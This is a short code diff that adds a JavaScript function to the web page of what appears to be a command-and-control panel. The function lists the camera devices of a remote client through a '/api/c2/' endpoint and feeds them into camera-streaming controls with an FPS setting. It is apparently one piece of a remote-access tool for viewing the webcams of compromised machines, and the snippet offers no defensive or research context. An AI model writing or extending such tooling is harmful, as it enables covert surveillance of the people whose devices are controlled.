@@ -1064,6 +1064,27 @@
 
         const camSelect = document.getElementById('cam-select');
 
+        async function loadCameraDevices() {
+            if (!camSelect) return;
+            try {
+                const res = await fetch('/api/c2/camera_devices/' + encodeURIComponent(clientId));
+                if (res.ok) {
+                    const devices = await res.json();
+                    if (devices && devices.length > 0) {
+                        camSelect.innerHTML = '';
+                        devices.forEach(d => {
+                            const opt = document.createElement('option');
+                            opt.value = d.id;
+                            opt.textContent = d.name + ' (#' + d.id + ')';
+                            camSelect.appendChild(opt);
+                        });
+                    }
+                }
+            } catch {}
+        }
+
+        loadCameraDevices();
+
         camToggleBtn.addEventListener('click', async () => {
             if (!camRunning) {
                 const fps = parseInt(camFpsSlider.value) || 10;
